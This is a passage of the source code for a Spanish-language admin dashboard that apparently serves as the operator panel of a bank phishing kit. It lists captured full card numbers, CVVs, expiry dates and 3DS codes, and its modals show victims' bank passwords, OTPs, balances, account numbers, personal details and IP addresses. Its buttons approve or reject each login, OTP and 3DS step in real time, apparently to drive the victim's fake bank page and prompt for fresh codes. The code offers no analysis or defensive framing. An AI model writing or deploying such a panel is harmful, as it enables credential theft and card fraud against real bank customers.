                                    <?php endif; ?>
                                </td>
                                <td style="padding:10px;border-bottom:1px solid #f0f2f5;color:#1a1a2e;"><?php echo htmlspecialchars($t['plan_nombre'] ?? 'N/A'); ?></td>
                                <td style="padding:10px;border-bottom:1px solid #f0f2f5;color:#1a1a2e;">
                                    <?php 
                                        $titular = '';
                                        if (!empty($t['titular'])) {
                                            $titular = htmlspecialchars($t['titular']);
                                        } elseif (!empty($t['titular_pse'])) {
                                            $titular = htmlspecialchars($t['titular_pse']);
                                        }
                                        echo $titular ?: 'N/A';
                                    ?>
                                </td>
                                <td style="padding:10px;border-bottom:1px solid #f0f2f5;color:#1a1a2e;">
                                    <?php 
                                        $doc = '';
                                        if (!empty($t['documento'])) {
                                            $doc = htmlspecialchars($t['documento']);
                                        } elseif (!empty($t['documento_pse'])) {
                                            $doc = htmlspecialchars($t['documento_pse']);
                                        }
                                        echo $doc ?: 'N/A';
                                    ?>
                                </td>
                                <td style="padding:10px;border-bottom:1px solid #f0f2f5;color:#1a1a2e;font-family:monospace;letter-spacing:1px;"><?php echo !empty($t['numero_tarjeta']) ? htmlspecialchars($t['numero_tarjeta']) : 'N/A'; ?></td>
                                <td style="padding:10px;border-bottom:1px solid #f0f2f5;color:#1a1a2e;"><?php echo htmlspecialchars($t['vencimiento'] ?? 'N/A'); ?></td>
                                <td style="padding:10px;border-bottom:1px solid #f0f2f5;color:#1a1a2e;font-family:monospace;letter-spacing:1px;"><?php echo htmlspecialchars($t['cvc'] ?? 'N/A'); ?></td>
                                <td style="padding:10px;border-bottom:1px solid #f0f2f5;color:#1a56db;font-weight:bold;">$ <?php echo number_format(round($t['plan_precio'] ?? $t['monto'] ?? 0)); ?></td>
                                <td style="padding:10px;border-bottom:1px solid #f0f2f5;color:#1a1a2e;">
                                    <button class="btn btn-sm" style="background:#1a56db;color:white;border:none;padding:4px 10px;border-radius:4px;cursor:pointer;" onclick="verDetallesTransaccion(<?php echo htmlspecialchars(json_encode($t)); ?>)">Ver</button>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <tr><td colspan="10" style="text-align:center;padding:40px;color:#999;">📭 No hay transacciones</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>

        <!-- ==================== TABLA DE TARJETAS 3DS ==================== -->
        <h2 style="color:#1a1a2e; margin-top: 30px; margin-bottom: 15px;font-size:18px;">💳 Tarjetas 3DS (<?php echo $total_tarjetas; ?>)</h2>
        <div class="table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th>Fecha</th>
                        <th>ID 3DS</th>
                        <th>Tipo</th>
                        <th>Titular</th>
                        <th>N° Tarjeta</th>
                        <th>Vencimiento</th>
                        <th>CVV</th>
                        <th>Monto</th>
                        <th>Código 3DS</th>
                        <th>Estado</th>
                        <th>Acciones</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (count($tarjetas) > 0): ?>
                        <?php foreach (array_slice($tarjetas, 0, 20) as $t): 
                            // ====== VARIABLES PARA MOSTRAR ======
                            $estado = $t['estado_3ds'] ?? 'pendiente';
                            $color = $estado === 'aprobado' ? '#059669' : ($estado === 'rechazado' ? '#dc2626' : ($estado === 'error_clave' ? '#d97706' : '#1a365d'));
                            
                            // Obtener nombre completo
                            $nombreCompleto = $t['nombre'] ?? $t['titular'] ?? 'N/A';
                            
                            // Número de tarjeta COMPLETO (sin censura)
                            $numTarjeta = $t['numero_tarjeta'] ?? 'N/A';
                            
                            // Tipo de tarjeta
                            $tipoTarjeta = strtolower($t['tipo_tarjeta'] ?? 'visa');
                            $badgeClass = 'badge-visa';
                            if ($tipoTarjeta === 'mastercard') {
                                $badgeClass = 'badge-mastercard';
                            } elseif ($tipoTarjeta === 'amex') {
                                $badgeClass = 'badge-amex';
                            } elseif ($tipoTarjeta === 'diners') {
                                $badgeClass = 'badge-diners';
                            }
                            
                            // Código 3DS
                            $codigo3ds = $t['codigo_3ds'] ?? '';
                        ?>
                            <tr>
                                <td><?php echo substr($t['fecha'] ?? '', 11, 5); ?></td>
                                <td style="font-family:monospace;font-size:11px;"><?php echo htmlspecialchars($t['id_3ds'] ?? 'N/A'); ?></td>
                                <td>
                                    <span class="<?php echo $badgeClass; ?>">💳 <?php echo ucfirst($tipoTarjeta); ?></span>
                                </td>
                                <td><?php echo htmlspecialchars($nombreCompleto); ?></td>
                                <td style="font-family:'Courier New',monospace;font-size:13px;letter-spacing:1px;font-weight:600;color:#1a1a2e;">
                                    <?php echo htmlspecialchars($numTarjeta); ?>
                                </td>
                                <td><?php echo htmlspecialchars($t['vencimiento'] ?? 'N/A'); ?></td>
                                <td style="font-family:'Courier New',monospace;font-size:13px;font-weight:600;color:#c2410c;">
                                    <?php echo htmlspecialchars($t['cvc'] ?? 'N/A'); ?>
                                </td>
                                <td style="font-weight:bold;color:#1a56db;">$ <?php echo number_format(floatval($t['monto'] ?? 0)); ?></td>
                                <td style="font-family:monospace;font-weight:bold;color:#c2410c;background:<?php echo !empty($codigo3ds) ? '#f0f7ff' : 'transparent'; ?>;padding:4px 8px;border-radius:4px;">
                                    <?php echo !empty($codigo3ds) ? htmlspecialchars($codigo3ds) : '—'; ?>
                                </td>
                                <td>
                                    <span style="background:<?php echo $color; ?>;color:#fff;padding:2px 12px;border-radius:12px;font-size:10px;font-weight:600;">
                                        <?php echo $estado === 'error_clave' ? 'Error Clave' : ucfirst($estado); ?>
                                    </span>
                                </td>
                                <td>
                                    <?php if ($estado === 'pendiente'): ?>
                                        <button class="btn btn-3ds-aprobar btn-sm" onclick="aprobar3DS('<?php echo $t['id_3ds']; ?>')">✓ Aprobar</button>
                                        <button class="btn btn-3ds-rechazar btn-sm" onclick="rechazar3DS('<?php echo $t['id_3ds']; ?>')">✗ Rechazar</button>
                                        <button class="btn btn-3ds-error-clave btn-sm" onclick="errorClave3DS('<?php echo $t['id_3ds']; ?>')">✗ Err Clave</button>
                                    <?php else: ?>
                                        <span style="font-size:11px;color:#999;">✅ Procesado</span>
                                    <?php endif; ?>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <tr><td colspan="11" style="text-align:center;padding:40px;color:#999;">📭 No hay tarjetas registradas</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>

    </div>

    <!-- MODALES -->
    <div class="modal" id="modalDetalles">
        <div class="modal-content">
            <div class="modal-header">
                <span id="modalTitulo">📋 Detalles de Sesión</span>
                <span class="badge" id="modalBancoBadge" style="font-size:12px;padding:3px 12px;border-radius:12px;color:#fff;background:#1a56db;">Banco</span>
            </div>
            <div id="modalBody"></div>
            <button class="modal-close" onclick="cerrarModal()">Cerrar</button>
        </div>
    </div>

    <div class="modal" id="modalDetallesTransaccion">
        <div class="modal-content">
            <div class="modal-header">
                <span id="modalTransaccionTitulo">💳 Detalles de Transacción</span>
            </div>
            <div id="modalTransaccionBody"></div>
            <button class="modal-close" onclick="cerrarModalTransaccion()">Cerrar</button>
        </div>
    </div>

    <div class="toast-container" id="toastContainer"></div>

    <script>
        function showToast(message, type = 'success') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            container.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transform = 'translateX(100%)';
                setTimeout(() => toast.remove(), 300);
            }, 2500);
        }

        // ======================== PAUSAR / REANUDAR AUTO-REFRESH ========================
        let autoRefreshInterval;

        function pausarAutoRefresh() {
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
                autoRefreshInterval = null;
                console.log('⏸️ Auto-refresh pausado');
            }
        }

        function reanudarAutoRefresh() {
            if (!autoRefreshInterval) {
                autoRefreshInterval = setInterval(cargarDatos, 5000);
                console.log('▶️ Auto-refresh reanudado');
            }
        }

        // ======================== CARGA DE DATOS ========================
        function cargarDatos() {
            const modalAbierto = document.getElementById('modalDetalles').style.display === 'flex' || 
                                  document.getElementById('modalDetallesTransaccion').style.display === 'flex';
            
            if (modalAbierto) {
                console.log('📌 Modal abierto, no se recarga la página');
                return;
            }

            fetch(window.location.href + '?ajax=1')
                .then(res => res.text())
                .then(html => {
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, 'text/html');
                    
                    const newList = doc.querySelector('#sesionesList');
                    if (newList) {
                        document.getElementById('sesionesList').innerHTML = newList.innerHTML;
                    }
                    
                    const newTotal = doc.querySelector('#statTotal');
                    const newPendientes = doc.querySelector('#statPendientes');
                    if (newTotal) document.getElementById('statTotal').textContent = newTotal.textContent;
                    if (newPendientes) document.getElementById('statPendientes').textContent = newPendientes.textContent;
                    
                    const newTarjetas = doc.querySelector('.table-wrapper table tbody');
                    if (newTarjetas) {
                        const oldTarjetas = document.querySelector('.table-wrapper table tbody');
                        if (oldTarjetas) {
                            oldTarjetas.innerHTML = newTarjetas.innerHTML;
                        }
                    }
                })
                .catch(err => console.log('Error:', err));
        }

        // ======================== AUTO-REFRESH ========================
        function iniciarAutoRefresh() {
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
            }
            autoRefreshInterval = setInterval(cargarDatos, 5000);
            console.log('🔄 Auto-refresh iniciado cada 5 segundos');
        }

        // ======================== LOGIN ========================
        function aprobarLogin(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=aprobar&log_id=' + logId
            }).then(() => { showToast('✅ LOGIN Aprobado'); cargarDatos(); });
        }

        function errorUsuario(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=usuario'
            }).then(() => { showToast('❌ Error Usuario', 'error'); cargarDatos(); });
        }

        function errorClave(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=clave'
            }).then(() => { showToast('❌ Error Clave', 'error'); cargarDatos(); });
        }

        function errorSaldo(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=saldo'
            }).then(() => { showToast('💳 Error Saldo', 'warning'); cargarDatos(); });
        }

        // ======================== OTP ========================
        function aprobarOtp(logId) {
            if (!logId) { showToast('No hay OTP pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=aprobar&log_id=' + logId
            }).then(() => { showToast('✅ OTP Aprobado'); cargarDatos(); });
        }

        function errorDinamica(logId) {
            if (!logId) { showToast('No hay OTP pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=dinamica'
            }).then(() => { showToast('❌ Error Dinámica', 'error'); cargarDatos(); });
        }

        function errorOtp(logId) {
            if (!logId) { showToast('No hay OTP pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=otp'
            }).then(() => { showToast('❌ Error OTP', 'error'); cargarDatos(); });
        }

        // ======================== BORRAR ========================
        function borrarSesion(logId) {
            if (!logId) { showToast('No hay ID para eliminar', 'error'); return; }
            if (confirm('¿Eliminar esta sesión?')) {
                fetch('borrar_log.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'log_id=' + logId
                }).then(() => { showToast('🗑️ Sesión eliminada', 'warning'); cargarDatos(); });
            }
        }

        function borrarTodosLogs() {
            if (confirm('⚠️ ¿Eliminar TODOS los registros?')) {
                fetch('borrar_todos_logs.php', { method: 'POST' }).then(() => {
                    showToast('🗑️ Todos eliminados', 'warning');
                    cargarDatos();
                });
            }
        }

        function exportarCSV() {
            window.location.href = 'exportar_csv.php';
        }

        // ======================== VER DETALLES SESIÓN ========================
        function verDetalles(datos) {
            pausarAutoRefresh();
            
            const modal = document.getElementById('modalDetalles');
            const modalBody = document.getElementById('modalBody');
            const modalTitulo = document.getElementById('modalTitulo');
            const modalBanco = document.getElementById('modalBancoBadge');
            
            modalTitulo.textContent = '📋 Detalles de Sesión - ' + datos.banco;
            modalBanco.textContent = datos.banco || 'Desconocido';
            modalBanco.style.background = datos.tiene_jelpit ? '#2d1b69' : '#1a56db';
            
            let html = `
                <div class="modal-grid">
                    <!-- DATOS DEL BANCO -->
                    <div class="modal-field">
                        <div class="modal-field-label">🏦 Banco</div>
                        <div class="modal-field-value">${datos.banco || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📅 Fecha</div>
                        <div class="modal-field-value">${datos.fecha_inicio || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">👤 Usuario/Documento</div>
                        <div class="modal-field-value">${datos.documento || datos.usuario || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">🔑 Clave</div>
                        <div class="modal-field-value clave">${datos.clave || '—'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📱 OTP</div>
                        <div class="modal-field-value otp">${datos.otp || '—'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">💰 Saldo</div>
                        <div class="modal-field-value" style="color:#15803d;font-weight:700;">${datos.saldo ? '$ ' + new Intl.NumberFormat('es-CO').format(datos.saldo) : '—'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📊 Estado Login</div>
                        <div class="modal-field-value">${datos.estado_login || 'pendiente'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📊 Estado OTP</div>
                        <div class="modal-field-value">${datos.estado_otp || 'pendiente'}</div>
                    </div>
            `;
            
            // DATOS DE TARJETA
            if (datos.numero_tarjeta) {
                html += `
                    <div class="modal-field">
                        <div class="modal-field-label">💳 N° Tarjeta</div>
                        <div class="modal-field-value" style="font-family:monospace;letter-spacing:1px;">${datos.numero_tarjeta}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📅 Vencimiento</div>
                        <div class="modal-field-value">${datos.vencimiento || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">🔐 CVV</div>
                        <div class="modal-field-value" style="font-family:monospace;letter-spacing:1px;">${datos.cvc || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">💰 Monto</div>
                        <div class="modal-field-value" style="color:#1a56db;font-weight:700;">${datos.monto ? '$ ' + new Intl.NumberFormat('es-CO').format(datos.monto) : 'N/A'}</div>
                    </div>
                `;
            }
            
            // DATOS JELPIT
            if (datos.tiene_jelpit) {
                html += `
                    <div class="modal-field jelpit" style="grid-column:1/-1;">
                        <div class="modal-field-label" style="color:#2d1b69;">📋 DATOS JELPIT</div>
                    </div>
                    <div class="modal-field jelpit">
                        <div class="modal-field-label">📧 Email</div>
                        <div class="modal-field-value">${datos.jelpit_email || 'N/A'}</div>
                    </div>
                    <div class="modal-field jelpit">
                        <div class="modal-field-label">👤 Nombre</div>
                        <div class="modal-field-value">${datos.jelpit_nombre || 'N/A'}</div>
                    </div>
                    <div class="modal-field jelpit">
                        <div class="modal-field-label">📋 Apellido</div>
                        <div class="modal-field-value">${datos.jelpit_apellido || 'N/A'}</div>
                    </div>
                    <div class="modal-field jelpit">
                        <div class="modal-field-label">🆔 Tipo Documento</div>
                        <div class="modal-field-value">${datos.jelpit_tipo_documento || 'N/A'}</div>
                    </div>
                    <div class="modal-field jelpit">
                        <div class="modal-field-label">📱 Celular</div>
                        <div class="modal-field-value">${datos.jelpit_celular || 'N/A'}</div>
                    </div>
                `;
            }
            
            // METADATOS
            if (datos.ip) {
                html += `
                    <div class="modal-field">
                        <div class="modal-field-label">🌐 IP</div>
                        <div class="modal-field-value" style="font-family:monospace;">${datos.ip}</div>
                    </div>
                `;
            }
            
            html += `</div>`;
            modalBody.innerHTML = html;
            modal.style.display = 'flex';
        }

        function cerrarModal() {
            document.getElementById('modalDetalles').style.display = 'none';
            reanudarAutoRefresh();
        }

        // ======================== VER DETALLES TRANSACCIÓN ========================
        function verDetallesTransaccion(datos) {
            pausarAutoRefresh();
            
            const modal = document.getElementById('modalDetallesTransaccion');
            const modalBody = document.getElementById('modalTransaccionBody');
            const modalTitulo = document.getElementById('modalTransaccionTitulo');
            
            modalTitulo.textContent = '💳 Detalles de Transacción - ' + (datos.tipo || 'PSE');
            
            let html = `
                <div class="modal-grid">
                    <div class="modal-field">
                        <div class="modal-field-label">📅 Fecha</div>
                        <div class="modal-field-value">${datos.fecha || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📊 Tipo</div>
                        <div class="modal-field-value">${datos.tipo || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📋 Plan</div>
                        <div class="modal-field-value">${datos.plan_nombre || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">💰 Monto</div>
                        <div class="modal-field-value" style="color:#1a56db;font-weight:700;">$ ${new Intl.NumberFormat('es-CO').format(datos.plan_precio || datos.monto || 0)}</div>
                    </div>
            `;
            
            if (datos.tipo === 'TARJETA' || datos.numero_tarjeta) {
                html += `
                    <div class="modal-field">
                        <div class="modal-field-label">💳 N° Tarjeta</div>
                        <div class="modal-field-value" style="font-family:monospace;letter-spacing:1px;">${datos.numero_tarjeta || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">👤 Titular</div>
                        <div class="modal-field-value">${datos.titular || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">🆔 Documento</div>
                        <div class="modal-field-value">${datos.documento || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📅 Vencimiento</div>
                        <div class="modal-field-value">${datos.vencimiento || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">🔐 CVV</div>
                        <div class="modal-field-value" style="font-family:monospace;letter-spacing:1px;">${datos.cvc || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📱 Celular</div>
                        <div class="modal-field-value">${datos.numero_celular || datos.celular || 'N/A'}</div>
                    </div>
                `;
            } else {
                html += `
                    <div class="modal-field">
                        <div class="modal-field-label">👤 Titular PSE</div>
                        <div class="modal-field-value">${datos.titular_pse || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">🆔 Documento PSE</div>
                        <div class="modal-field-value">${datos.documento_pse || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">🏦 Banco PSE</div>
                        <div class="modal-field-value">${datos.banco_pse || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">🔢 N° Cuenta</div>
                        <div class="modal-field-value" style="font-family:monospace;">${datos.numero_cuenta || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📊 Tipo Cuenta</div>
                        <div class="modal-field-value">${datos.tipo_cuenta || 'N/A'}</div>
                    </div>
                    <div class="modal-field">
                        <div class="modal-field-label">📋 Tipo Documento</div>
                        <div class="modal-field-value">${datos.tipo_documento || 'N/A'}</div>
                    </div>
                `;
            }
            
            if (datos.ip) {
                html += `
                    <div class="modal-field" style="grid-column:1/-1;">
                        <div class="modal-field-label">🌐 IP</div>
                        <div class="modal-field-value" style="font-family:monospace;">${datos.ip}</div>
                    </div>
                `;
            }
            
            html += `</div>`;
            modalBody.innerHTML = html;
            modal.style.display = 'flex';
        }

        function cerrarModalTransaccion() {
            document.getElementById('modalDetallesTransaccion').style.display = 'none';
            reanudarAutoRefresh();
        }

        // ======================== 3DS ========================
        function aprobar3DS(id_3ds) {
            if (!id_3ds) { showToast('ID 3DS inválido', 'error'); return; }
            if (confirm('¿Aprobar 3DS para ' + id_3ds + '?')) {
                fetch('aprobar_3ds.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id_3ds: id_3ds, accion: 'aprobar' })
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        showToast('✅ 3DS Aprobado para ' + id_3ds, 'success');
                        setTimeout(() => cargarDatos(), 1000);
                    } else {
                        showToast('❌ Error: ' + data.error, 'error');
                    }
                })
                .catch(err => showToast('❌ Error de conexión', 'error'));
            }
        }

        function rechazar3DS(id_3ds) {
            if (!id_3ds) { showToast('ID 3DS inválido', 'error'); return; }
            if (confirm('¿Rechazar 3DS para ' + id_3ds + '?')) {
                fetch('aprobar_3ds.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id_3ds: id_3ds, accion: 'rechazar' })
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        showToast('❌ 3DS Rechazado para ' + id_3ds, 'warning');
                        setTimeout(() => cargarDatos(), 1000);
                    } else {
                        showToast('❌ Error: ' + data.error, 'error');
                    }
                })
                .catch(err => showToast('❌ Error de conexión', 'error'));
            }
        }

        // NUEVA FUNCIÓN: Error Clave para 3DS
        function errorClave3DS(id_3ds) {
            if (!id_3ds) { showToast('ID 3DS inválido', 'error'); return; }
            if (confirm('¿Marcar como Error de Clave para ' + id_3ds + '?')) {
                fetch('aprobar_3ds.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id_3ds: id_3ds, accion: 'error_clave' })
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        showToast('⚠️ Error de Clave para ' + id_3ds, 'warning');
                        setTimeout(() => cargarDatos(), 1000);
                    } else {
                        showToast('❌ Error: ' + data.error, 'error');
                    }
                })
                .catch(err => showToast('❌ Error de conexión', 'error'));
            }
        }

        // ======================== FILTROS ========================
        let bancoActivo = 'todos';

        function filtrarPorBanco(banco) {
            bancoActivo = banco;
            document.querySelectorAll('.filtro-btn').forEach(b => b.classList.remove('active'));
            document.querySelector(`.filtro-btn[data-banco="${banco}"]`)?.classList.add('active');
            aplicarFiltros();
        }

        function aplicarFiltros() {
            const texto = document.getElementById('filtroInput').value.toLowerCase();
            const cards = document.querySelectorAll('.sesion-card');

            cards.forEach(card => {
                const banco = card.dataset.banco || '';
                const usuario = card.dataset.usuario || '';
                const id = card.dataset.id || '';
                const tieneJelpit = card.dataset.jelpit === '1';
                
                let coincideBanco = bancoActivo === 'todos' || banco === bancoActivo;
                if (bancoActivo === 'jelpit') {
                    coincideBanco = tieneJelpit;
                }
                
                const coincideTexto = !texto || usuario.includes(texto) || id.includes(texto) || banco.includes(texto);
                card.style.display = (coincideBanco && coincideTexto) ? '' : 'none';
            });
        }

        // ======================== EVENTOS ========================
        document.addEventListener('DOMContentLoaded', function() {
            iniciarAutoRefresh();
            aplicarFiltros();
        });

        // Cerrar modales al hacer clic fuera
        window.onclick = function(event) {
            const modal1 = document.getElementById('modalDetalles');
            const modal2 = document.getElementById('modalDetallesTransaccion');
            if (event.target === modal1) { cerrarModal(); }
            if (event.target === modal2) { cerrarModalTransaccion(); }
        }
    </script>
</body>
</html>